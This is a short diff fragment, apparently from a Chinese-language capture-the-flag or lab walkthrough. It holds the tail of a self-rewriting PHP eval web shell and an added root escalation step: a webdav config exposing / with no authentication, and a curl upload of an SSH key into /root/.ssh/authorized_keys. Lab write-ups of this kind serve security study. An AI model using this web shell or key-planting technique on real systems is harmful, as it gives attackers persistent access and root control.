@@ -80,3 +80,13 @@ $code="<?php @eval(\$_POST[\"pass\"]); ?>";while(true)
 {file_put_contents($file,$code);}chmod($file,0777);usleep(1000
 0);} ?>'
 ```
+在连上nolesss用户后利用sudo -l发现有webdav的root权限修改配置，写入公钥提权root
+```
+address: 0.0.0.0
+port: 9999
+directory: /
+permissions: CRUD
+auth: false
+
+curl -T id_rsa_kong.pub http://192.168.56.3:9999/root/.ssh/authorized_keys
+```
